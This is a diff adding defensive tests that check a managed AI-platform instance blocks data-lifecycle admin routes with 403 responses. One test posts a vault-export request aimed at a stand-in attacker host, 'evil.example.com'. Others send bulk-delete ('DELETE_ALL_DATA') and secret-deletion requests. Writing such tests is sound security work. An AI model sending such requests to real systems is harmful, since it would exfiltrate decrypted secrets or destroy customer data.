@@ -4158,3 +4158,71 @@ describe('metered audio routes: managed credit gate + debit', () => {
     });
   });
 });
+
+describe('managed instance: data-lifecycle admin routes are system-controlled', () => {
+  // On a managed instance the customer cookie carries admin scope (the control
+  // plane provisions no LYNOX_HTTP_ADMIN_SECRET). Routes that exfiltrate data
+  // off-box or run instance-wide data lifecycle must be CP-controlled. The
+  // load-bearing case is POST /api/migration/export, whose handler ships the
+  // entire DECRYPTED vault (all infra + customer secrets) to a caller-chosen
+  // target — strictly worse than the infra-secret DELETE this also gates.
+  afterEach(() => {
+    // Restore the tier WITHOUT vi.unstubAllEnvs() (that would also drop the
+    // LYNOX_HTTP_SECRET the module beforeAll relies on for request auth).
+    vi.stubEnv('LYNOX_BILLING_TIER', undefined);
+  });
+
+  it('403s POST /api/migration/export on a managed instance', async () => {
+    vi.stubEnv('LYNOX_BILLING_TIER', 'managed');
+    const res = await jsonFetch('/api/migration/export', {
+      method: 'POST',
+      body: JSON.stringify({ targetUrl: 'https://evil.example.com', migrationToken: 'a'.repeat(64) }),
+    });
+    expect(res.status).toBe(403);
+    expect((await res.json() as { error: string }).error).toContain('system-controlled');
+  });
+
+  it('403s bulk data deletion on a managed instance', async () => {
+    vi.stubEnv('LYNOX_BILLING_TIER', 'managed');
+    const res = await jsonFetch('/api/data', {
+      method: 'DELETE',
+      body: JSON.stringify({ confirm: 'DELETE_ALL_DATA' }),
+    });
+    expect(res.status).toBe(403);
+    expect((await res.json() as { error: string }).error).toContain('system-controlled');
+  });
+
+  it('403s backup restore on a managed instance', async () => {
+    vi.stubEnv('LYNOX_BILLING_TIER', 'managed');
+    const res = await jsonFetch('/api/backups/some-id/restore', { method: 'POST' });
+    expect(res.status).toBe(403);
+    expect((await res.json() as { error: string }).error).toContain('system-controlled');
+  });
+
+  it('does NOT guard GET /api/export — own-content GDPR access stays available', async () => {
+    // /api/export dumps only the customer's own threads/memory/KG/CRM (no
+    // secrets), so it is a legitimate Art. 15/20 path and must not be blocked.
+    vi.stubEnv('LYNOX_BILLING_TIER', 'managed');
+    const res = await jsonFetch('/api/export');
+    expect(res.status).not.toBe(403);
+  });
+
+  it('does NOT block migration export on self-host (no billing tier)', async () => {
+    const res = await jsonFetch('/api/migration/export', {
+      method: 'POST',
+      body: JSON.stringify({ targetUrl: 'https://example.com', migrationToken: 'a'.repeat(64) }),
+    });
+    expect(res.status).not.toBe(403);
+  });
+
+  it('blocks deleting infra/CP secrets on managed but allows a customer tool secret', async () => {
+    vi.stubEnv('LYNOX_BILLING_TIER', 'managed');
+    for (const name of ['LYNOX_VAULT_KEY', 'GOOGLE_CLIENT_SECRET', 'MANAGED_TOKEN']) {
+      const res = await jsonFetch(`/api/secrets/${name}`, { method: 'DELETE' });
+      expect(res.status, name).toBe(403);
+      expect((await res.json() as { error: string }).error).toContain('admin-managed');
+    }
+    const tool = await jsonFetch('/api/secrets/SHOPIFY_TOKEN', { method: 'DELETE' });
+    expect(tool.status).not.toBe(403);
+  });
+});
